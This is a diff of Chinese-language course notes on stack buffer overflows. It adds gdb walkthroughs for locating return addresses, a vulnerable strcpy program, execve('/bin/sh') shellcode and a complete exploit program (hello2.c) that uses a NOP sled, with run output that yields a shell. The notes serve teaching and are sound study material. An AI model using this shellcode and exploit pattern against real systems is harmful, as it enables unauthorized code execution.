@@ -1647,17 +1647,19 @@ Breakpoint 1, function (a=1, b=2, c=3) at ovr_ret.c:6
 ## (gdb) $ x buffer1
 0xbffffd10:     0x08048400
 // 此处可以推出 $ebp– buffer1 = 24
+// 由于根据结构而言 retip = $ebp + 4，也就是ebp的下一个字长为函数返回地址
+// 推导出
+// retip – buffer1 = 28
 ## (gdb) $ x buffer2
 0xbffffd00:     0xbffffdac
 ## (gdb) $ x/20 $esp
+// 此处是指从esp开始的20个字长(4字节)的内容，第一列表示从这个地址开始的连续四个字长的内容
 0xbffffcf0:     0x4014a870      0xbffffd04      0x40030c85      0x4014a880
 0xbffffd00:     0xbffffdac      0xbffffd24      0x40030d3f      0x40016ca0
 0xbffffd10:     0x08048400      0x08049604      0xbffffd28      0x0804828d
-0xbffffd20:     0x40017074      0x40017af0      0xbffffd48      0x080483d5 retip
+0xbffffd20:     0x40017074      0x40017af0      0xbffffd48      0x080483d5 retip(由于ebp在地址0xbffffd28值为0xbffffd48，所以其下一个字长地址即为retip，值为0x080483d5)
 0xbffffd30:     0x00000001      0x00000002      0x00000003      0x4014a880
-// 此处可以推出 retip = $ebp + 4
-// 推导出
-// retip – buffer1 = 28
+// 进行反编译
 ## (gdb) $ disas main
 Dump of assembler code for function main:
 0x080483a2 <main+0>:    push   %ebp
@@ -1671,15 +1673,17 @@ Dump of assembler code for function main:
 0x080483c1 <main+31>:   movl $0x2,0x4(%esp)
 0x080483c9 <main+39>:   movl $0x1,(%esp)
 0x080483d0 <main+46>:   call   0x8048384 <function>
-0x080483d5 <main+51>:   movl $0x1,0xfffffffc(%ebp) // 此处
-0x080483dc <main+58>:   mov 0xfffffffc(%ebp),%eax // 此处
+0x080483d5 <main+51>:   movl $0x1,0xfffffffc(%ebp) // 此处根据上方的retip值为0x080483d5可知，此处为retip
+// 由于函数返回地址也就是直接返回到函数结束后下一条命令的位置，且上述汇编代码将0x1的值赋值给一个变量，可知其为x = 1;代码地址
+0x080483dc <main+58>:   mov 0xfffffffc(%ebp),%eax // 那么此处就是printf语句地址
 0x080483df <main+61>:   mov %eax,0x4(%esp)
 0x080483e3 <main+65>:   movl $0x8048514,(%esp)
 0x080483ea <main+72>:   call   0x80482b0 <_init+56>
 0x080483ef <main+77>:   leave  
 0x080483f0 <main+78>:   ret    
 End of assembler dump.
-// new retip – old retip = 7
+// 通过上面可推理出需要跳过x = 1;直接跳到printf，则需要把函数返回地址从地址0x080483d5改到0x080483dc
+// new retip – old retip = 7 
 ```
 
 - [x] 修改后的程序
@@ -1715,6 +1719,65 @@ $ ./ovr_ret_new
 0
 ```
 
+- [x] 函数调用情况
+
+```term
+## (gdb) $ disas main
+Dump of assembler code for function main:
+…
+0x080483b9 <main+23>:   movl $0x3,0x8(%esp)
+0x080483c1 <main+31>:   movl $0x2,0x4(%esp)
+0x080483c9 <main+39>:   movl $0x1,(%esp) // 分配栈帧
+0x080483d0 <main+46>:   call   0x8048384 <function> // 函数调用
+0x080483d5 <main+51>:   movl $0x1,0xfffffffc(%ebp) // 函数返回地址
+…
+End of assembler dump.
+## (gdb) $ disas function
+Dump of assembler code for function function:
+0x08048384 <function+0>:       push   %ebp // 在函数调用地址
+0x08048385 <function+1>:       mov  %esp, %ebp // 将原来函数的esp赋值给ebp
+0x08048387 <function+3>:       sub  $0x38, %esp // 原有esp减去一个值也就是分配一个新的栈帧
+…
+0x080483a1 <function+29>:      ret     
+End of assembler dump.
+```
+
+- [x] 函数调用所建立的栈帧包含(以IA32为例)：
+  - 函数的返回地址
+  - 调用函数的栈帧信息，即栈顶和栈底
+  - 为函数的局部变量分配的空间
+  - 为被调用函数的参数分配的空间
+
+```term
+$ gdb ovr_ret_new
+## (gdb) $ b 6
+Breakpoint 1 at 0x804838a: file ovr_ret_new.c, line 6.
+## (gdb) $ r
+Starting program: /home/example/ovr_ret_new 
+Breakpoint 1, function (a=1, b=2, c=3) at ovr_ret_new.c:6
+6      ret = buffer1 + 28;
+## (gdb) $ x $esp                     
+0xbffffcf0:     0x4014a870
+## (gdb) $ x $ebp
+0xbffffd28:     0xbffffd48
+## (gdb) $ x buffer1
+0xbffffd10:     0x08048400
+## (gdb) $ x buffer2
+0xbffffd00:     0xbffffdac
+## (gdb) $ x/20 $esp
+0xbffffce0:     0x4014a870      0xbffffcf4      0x40030c85      0x4014a880
+0xbffffcf0:     0xbffffd9c      0xbffffd14      0x40030d3f      0x40016ca0
+0xbffffd00:     0x08048400      0x08049604      0xbffffd18      0x0804828d
+0xbffffd10:     0x40017074      0x40017af0      0xbffffd38      0x080483d5
+0xbffffd20:     0x00000001      0x00000002      0x00000003      0x4014a880
+```
+
+- [x] 函数调用所建立的栈帧包含(以IA32为例)：
+  - 为被调用函数的参数分配的空间 0x00000001   0x00000002  0x00000003
+  - 函数的返回地址 0x080483d5
+  - 调用函数的栈帧信息，即栈顶和栈底 0x4014a870 0xbffffd38
+  - 为函数的局部变量分配的空间 buffer2:16(buffer1地址-buffer2地址)  buffer1:24(ebp地址-buffer1地址)
+
 <!-- tabs:end -->
 
 <!-- tabs:end -->
@@ -1728,7 +1791,9 @@ $ ./ovr_ret_new
   - Linux debian 2.4.18-bf2.4 #1 Son Apr 14 09:53:28 CEST 2002 i686 unknown
   - Gcc 3.3.5
 
-#### 缺陷程序
+<!-- tabs:start -->
+
+#### **缺陷程序**
 
 ```C
 // 命名为hello.c
@@ -1737,8 +1802,10 @@ $ ./ovr_ret_new
 
 void SayHello(char* name){
   char tmpName[60];
+
   // buffer overflow
   strcpy(tmpName, name);
+
   printf("Hello %s\n", tmpName);
 }
 
@@ -1752,7 +1819,9 @@ int main(int argc, char** argv){
 }
 ```
 
-> - 运行情况如下：
+<!-- tabs:start -->
+
+##### **运行情况如下**
 
 ```term
 $ gcc–g –o hello hello.c
@@ -1765,7 +1834,7 @@ Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault
 ```
 
-> - 调试情况如下：
+##### **调试情况如下**
 
 ```term
 $ gdb hello
@@ -1779,8 +1848,9 @@ $ gdb hello
 0xbffffca0:     0x4014a870
 ## (gdb) $ x/4 $ebp
 0xbffffce8:     0xbffffcf8      0x0804842c      0xbffffe41      0xbffffd54
-// $ebp返回地址:0x0804842c(这个是后续调试知道的)
-// $ebp – tmpName = 0xbffffce8–0xbffffca0=72
+// 返回地址内容：0x0804842c(同样的由于retip紧跟ebp后可得到)
+// $ebp内容：0xbffffcf8
+// $ebp – tmpName = 0xbffffce8 – 0xbffffca0 = 72
 ## (gdb) $ disas main
 Dump of assembler code for function main:
 0x080483f1 <main+0>:    push   %ebp
@@ -1790,8 +1860,7 @@ Dump of assembler code for function main:
 0x080483fa <main+9>:    mov    $0x0,%eax
 0x080483ff <main+14>:   sub    %eax,%esp
 0x08048401 <main+16>:   cmpl   $0x2,0x8(%ebp)
-0x08048405 <main+20>:   je    
-0x804841c <main+43>
+0x08048405 <main+20>:   je     0x804841c <main+43>
 0x08048407 <main+22>:   movl   $0x804855e,(%esp)
 0x0804840e <main+29>:   call   0x80482d8 <_init+56>
 0x08048413 <main+34>:   movl   $0x1,0xfffffffc(%ebp)
@@ -1800,7 +1869,7 @@ Dump of assembler code for function main:
 0x0804841f <main+46>:   add    $0x4,%eax
 0x08048422 <main+49>:   mov    (%eax),%eax
 0x08048424 <main+51>:   mov    %eax,(%esp)
-0x08048427 <main+54>:   call 0x80483c4 <SayHello> // 返回地址
+0x08048427 <main+54>:   call   0x80483c4 <SayHello> // 返回地址，由上可得
 0x0804842c <main+59>:   movl   $0x0,0xfffffffc(%ebp)
 0x08048433 <main+66>:   mov    0xfffffffc(%ebp),%eax
 0x08048436 <main+69>:   leave  
@@ -1813,7 +1882,7 @@ End of assembler dump.
 0xbffffcc0:     0x08048440      0x08049660      0xbffffcd8      0x080482b5
 0xbffffcd0:     0x40017074      0x40017af0      0xbffffcf8      0x0804845b
 0xbffffce0:     0x4014a880      0x080484a0      0xbffffcf8      0x0804842c
-## (gdb) $ n //执行“strcpy(tmpName, name);”
+## (gdb) $ n //执行“strcpy(tmpName, name);”，因为断点在此步，n即单步运行此步
 11          printf("Hello %s\n", tmpName);
 ## (gdb) $ x/24 $esp
 0xbffffc90:     0xbffffca0      0xbffffe41      0x4008978e      0x4014a880
@@ -1822,8 +1891,216 @@ End of assembler dump.
 0xbffffcc0:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffffcd0:     0x41414141      0x41414141      0x41414141      0x41414141
 0xbffffce0:     0x41414141      0x41414141      0xbffffc00      0x0804842c
-// $ebp内容被覆盖Segmentation fault
+// $ebp内容被覆盖(原有的倒数第一行倒数第二个0xbffffcf8也就是ebp的内容被修改为0xbffffc00)
+// Segmentation fault
 ```
+
+<!-- tabs:end -->
+
+#### **如果精心选择数据**
+
+<p align="center">
+  <img src="./img/如果精心选择数据.png"></img>
+</p>
+
+- [x] 如何选择这些数据？
+  - 几个问题：
+    - SayHello函数局部变量区大小？
+    - NNNNNNNN如何确定？
+    - Our-codes该怎样写
+    - 输入缓冲区内容不能包含0
+
+<!-- tabs:start -->
+
+##### **局部变量区问题**
+
+<p align="center">
+  <img src="./img/局部变量区问题.png"></img>
+</p>
+
+##### **代码起始地址如何确定？**
+
+<p align="center">
+  <img src="./img/局部变量区问题.png"></img>
+</p>
+
+- [x] 问题已转化为用ESP加上某一偏移
+  - 该偏移<span style="color:blue;">不需要精确</span>
+
+- [x] ESP如何确定呢
+  - 用同样选项，插入一段代码，重新编译
+  - 使用调试工具跟踪应用程序
+  - 编一小程序，打印出运行时栈顶位置
+    - <span style="color:blue;">在同样环境下，不同进程之间栈位置距离不会太远</span>
+
+- [x] 为什么偏移不需要精确？
+
+<p align="center">
+  <img src="./img/为什么偏移不需要精确.png"></img>
+</p>
+
+<!-- chat:start -->
+
+<!-- title:理解 -->
+
+#### **Tips**
+
+如果一直没有找到有效代码，其就会一直把无效地址操作出栈，直到命中真实代码。 
+
+<!-- chat:end -->
+
+##### **Shellcode编写**
+
+- [x] execve - execute program
+- [x] <kbd style="color:purple">int execve(const char *filename, char *const argv [], char *const envp[]);</kbd>
+- [x] <kbd style="color:purple">execve("pointer to string /bin/sh", "pointer to /bin/sh", "pointer to NULL");</kbd>
+
+```shell
+jmp short callit              ; jmp trick as explained above
+doit:
+pop         esi ;             ; esi now represents the location of our string
+xor         eax, eax          ; make eax 0
+mov byte    [esi + 7], al     ; terminate /bin/sh 
+lea         ebx, [esi]        ; get the adress of /bin/sh and put it in register ebx 
+mov long    [esi + 8], ebx    ; put the value of ebx (the address of /bin/sh) in AAAA ([esi +8]) 
+mov long    [esi + 12], eax   ; put NULL in BBBB (remember xor eax, eax) 
+mov byte    al, 0x0b          ; Execution time! we use syscall 0x0b which represents execve
+mov         ebx, esi          ; argument one... ratatata /bin/sh
+lea         ecx, [esi + 8]    ; argument two... ratatata our pointer to /bin/sh
+lea         edx, [esi + 12]   ; argument three... ratataa our pointer to NULL 
+int         0x80 
+
+callit:     
+call        doit              ; part of the jmp trick to get the location of db
+db          '/bin/sh#AAAABBBB'
+```
+
+- [x] Shellcode二进制形式
+
+```c
+// 其以/bin/sh#AAAABBBB结尾前面为乱码 
+char shellcode[] =
+ "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
+ "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
+ "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41"
+ "\x42\x42\x42\x42";
+```
+
+<!-- tabs:end -->
+
+#### **完整的攻击hello的程序**
+
+```c
+//  hello2.c
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+unsigned char shell_code[] =
+"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
+"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
+"\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41"
+"\x42\x42\x42\x42";
+
+#define DEFAULT_OFFSET  0
+#define BUFFER_SIZE 1024
+
+unsigned long get_esp() {
+    unsigned long esp;
+    __asm__("movl %%esp, %0" : "=r"(esp));
+    return esp;
+}
+
+int main(int argc, char** argv)
+{
+  char* buff;
+  char* ptr;
+  unsigned long* addr_ptr;
+  unsigned long esp;
+  int i, ofs;
+  if (argc == 1)
+    ofs = DEFAULT_OFFSET;
+  else
+    ofs = atoi(argv[1]);
+
+  ptr = buff = malloc(4 * BUFFER_SIZE);
+
+  /* Fill in with addresses */
+  addr_ptr = (unsigned long*)ptr;
+  esp = get_esp();
+  printf("ESP = %08x\n", esp);
+  for (i = 0; i < 100; i++)
+    *(addr_ptr++) = esp + ofs;
+
+  /* Fill the start of shell buffer with NOPs */
+  ptr = (char*)addr_ptr;
+  memset(ptr,0x90,BUFFER_SIZE-strlen(shell_code));
+  ptr += BUFFER_SIZE - strlen(shell_code);
+
+  /* And then the shell code */
+  memcpy(ptr, shell_code, strlen(shell_code));
+  ptr += strlen(shell_code);
+
+  *ptr = 0;
+
+  execl("./hello", "hello", buff, NULL);
+
+  return 0;  
+}
+```
+
+<!-- tabs:start -->
+
+##### **运行情况**
+
+```term
+$ gcc–g –o hello2 hello2.c
+$ ./hello2
+ESP = bffffd18
+Hello 
+ýÿ¿ ýÿ¿ ýÿ¿ ý¿ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ýÿ¿ ý
+...   //省略
+...  //省略
+ë^1ÀˆF‰‰F
+...  //省略
+‰óV
+...  //省略
+Í€èáÿÿÿ/bin/sh#AAAABBBB
+sh-2.05b$
+```
+
+##### **调试情况**
+
+```term
+$ gdb hello
+## (gdb) $ b 52
+Breakpoint 1 at 0x80485e5: file hello2.c, line 52.
+## (gdb) $ r
+Starting program: /home/dayin/hello
+ESP = bffffd18
+Breakpoint 1, main (argc=1, argv=0xbffffda4) at hello2.c:52
+52execl("./hello", "hello", buff, NULL);
+(gdb) x/360 buff
+
+0x80498f8:   0xbffffd18   0xbffffd18 0xbffffd18 0xbffffd18
+…
+0x8049a78:   0xbffffd18   0xbffffd18 0xbffffd18 0xbffffd18
+// 上面为粗略代码起始地址
+
+0x8049a88:   0x90909090   0x90909090 0x90909090 0x90909090
+…
+0x8049e48:   0x90909090   0x90909090 0x90909090 0xeb909090
+// 上面为NOP区域
+
+0x8049e58:   0xc0315e1a   0x8d074688   0x085e891e   0xb00c4689
+0x8049e68:   0x8df3890b   0x568d084e   0xe880cd0c   0xffffffe1
+0x8049e78:   0x6e69622f   0x2368732f   0x41414141   0x42424242
+0x8049e88:   0x00000000   0x00000000 0x00000000 0x00000000
+// 以上为shellcode
+```
+
+<!-- tabs:end -->
+
+<!-- tabs:end -->
 
 #### 插曲：strncpyVS. memcpy
 
